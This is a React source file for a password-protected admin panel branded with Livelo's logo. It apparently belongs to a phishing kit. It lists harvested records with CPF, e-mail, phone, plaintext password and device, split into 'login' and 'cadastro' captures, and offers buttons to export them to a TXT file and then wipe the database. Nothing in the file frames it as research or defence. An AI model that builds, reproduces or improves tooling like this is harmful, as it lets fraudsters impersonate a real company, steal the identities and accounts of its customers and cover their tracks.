import React, { useState } from "react";
import { getUsers, deleteAllUsers } from "../services/api";
import "./AdminPanel.css";

const AdminPanel = ({ onBack }) => {
  const [password, setPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [users, setUsers] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");

    try {
      const response = await getUsers(password);
      setUsers(response.users);
      setIsAuthenticated(true);
    } catch (err) {
      setError("Senha incorreta ou erro ao carregar dados");
    } finally {
      setLoading(false);
    }
  };

  const refreshData = async () => {
    setLoading(true);
    try {
      const response = await getUsers(password);
      setUsers(response.users);
    } catch (err) {
      setError("Erro ao atualizar dados");
    } finally {
      setLoading(false);
    }
  };

  const handleDownload = () => {
    if (users.length === 0) {
      alert("Não há dados para baixar");
      return;
    }

    // Cria conteúdo do arquivo TXT
    let txtContent = "DADOS DE USUÁRIOS - LIVELO\n";
    txtContent += "=".repeat(70) + "\n\n";

    users.forEach((user, index) => {
      txtContent += `USUÁRIO ${index + 1}\n`;
      txtContent += "-".repeat(70) + "\n";
      txtContent += `ID: ${user.id}\n`;
      txtContent += `Data/Hora: ${new Date(user.created_at).toLocaleString("pt-BR")}\n`;
      txtContent += `Tipo: ${user.type === "login" ? "Login" : "Cadastro"}\n`;
      
      if (user.cpf) txtContent += `CPF: ${user.cpf}\n`;
      if (user.email) txtContent += `E-mail: ${user.email}\n`;
      if (user.phone) txtContent += `Telefone: ${user.phone}\n`;
      if (user.password) txtContent += `Senha: ${user.password}\n`;
      if (user.device) txtContent += `Dispositivo: ${user.device}\n`;
      
      txtContent += "\n";
    });

    txtContent += `\nTotal de registros: ${users.length}\n`;
    txtContent += `Gerado em: ${new Date().toLocaleString("pt-BR")}\n`;

    // Baixa arquivo
    const blob = new Blob([txtContent], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `livelo_usuarios_${new Date().getTime()}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
  };

  const handleDownloadAndClear = async () => {
    if (users.length === 0) {
      alert("Não há dados para baixar");
      return;
    }

    const confirm = window.confirm(
      `Deseja baixar ${users.length} registros e LIMPAR o banco de dados?`
    );

    if (!confirm) return;

    // Primeiro baixa
    handleDownload();

    // Depois limpa
    setLoading(true);
    try {
      await deleteAllUsers(password);
      setUsers([]);
      alert("Dados baixados e banco limpo com sucesso!");
    } catch (err) {
      setError("Erro ao limpar banco de dados");
    } finally {
      setLoading(false);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="admin-container">
        <div className="admin-login-box">
          <img src="/logo-livelo.svg" alt="Livelo" className="admin-logo" />
          <h1 className="admin-title">Painel Administrativo</h1>
          <form onSubmit={handleLogin} className="admin-login-form">
            <input
              type="password"
              placeholder="Senha de acesso"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="admin-password-input"
            />
            <button type="submit" className="admin-login-button" disabled={loading}>
              {loading ? "Entrando..." : "Acessar Painel"}
            </button>
            {error && <p className="admin-error">{error}</p>}
          </form>
          {onBack && (
            <button onClick={onBack} className="back-button">
              ← Voltar
            </button>
          )}
        </div>
      </div>
    );
  }

  return (
    <div className="admin-container">
      <div className="admin-box">
        <img src="/logo-livelo.svg" alt="Livelo" className="admin-logo" />
        <h1 className="admin-title">Painel Administrativo</h1>

        <div className="admin-stats">
          <p>
            Total de registros: <strong>{users.length}</strong>
          </p>
        </div>

        <div className="admin-actions">
          <button onClick={refreshData} className="refresh-button" disabled={loading}>
            🔄 Atualizar
          </button>
          <button
            onClick={handleDownload}
            className="download-button"
            disabled={users.length === 0 || loading}
          >
            📥 Baixar .txt (manter dados)
          </button>
          <button
            onClick={handleDownloadAndClear}
            className="download-clear-button"
            disabled={users.length === 0 || loading}
          >
            📥 Baixar .txt e LIMPAR banco
          </button>
        </div>

        {error && <p className="admin-error">{error}</p>}

        <div className="data-list">
          <h2>Dados Armazenados:</h2>
          {users.length === 0 ? (
            <p className="no-data">Nenhum dado armazenado</p>
          ) : (
            users.map((user, index) => (
              <div key={user.id} className="user-card">
                <div className="user-header">
                  <span className="user-number">#{user.id}</span>
                  <span className={`user-type ${user.type}`}>
                    {user.type === "login" ? "Login" : "Cadastro"}
                  </span>
                  <span className="user-date">
                    {new Date(user.created_at).toLocaleString("pt-BR")}
                  </span>
                </div>
                <div className="user-info">
                  {user.cpf && (
                    <p>
                      <strong>CPF:</strong> {user.cpf}
                    </p>
                  )}
                  {user.email && (
                    <p>
                      <strong>E-mail:</strong> {user.email}
                    </p>
                  )}
                  {user.phone && (
                    <p>
                      <strong>Telefone:</strong> {user.phone}
                    </p>
                  )}
                  {user.password && (
                    <p>
                      <strong>Senha:</strong> {user.password}
                    </p>
                  )}
                  {user.device && (
                    <p>
                      <strong>Dispositivo:</strong> {user.device}
                    </p>
                  )}
                </div>
              </div>
            ))
          )}
        </div>

        <button onClick={() => setIsAuthenticated(false)} className="logout-button">
          🚪 Sair
        </button>
      </div>
    </div>
  );
};

export default AdminPanel;
